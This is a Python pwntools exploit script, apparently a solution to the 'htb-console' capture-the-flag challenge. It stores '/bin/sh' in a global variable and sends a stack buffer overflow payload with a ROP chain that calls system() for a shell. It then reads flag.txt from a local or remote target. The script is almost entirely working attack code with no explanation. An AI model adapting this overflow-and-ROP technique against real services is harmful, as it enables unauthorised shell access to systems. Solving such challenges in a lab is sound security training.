#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf):
    hof_global = 0x4040b0
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    system = 0x401381 

    io.sendlineafter(b">> ", b"hof")
    io.sendlineafter(b"name: ", b"/bin/sh")

    rop_chain = flat(pop_rdi, hof_global, system)
    payload = b"A"*24 + rop_chain

    io.sendlineafter(b">> ", b"flag")
    io.sendlineafter(b"flag: ", payload)
    io.recvline()
    sleep(0.2)
    
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)



def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./htb-console")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    
    elf = ELF("./htb-console")
    exploit(io, elf)



if __name__ == "__main__":
    main()
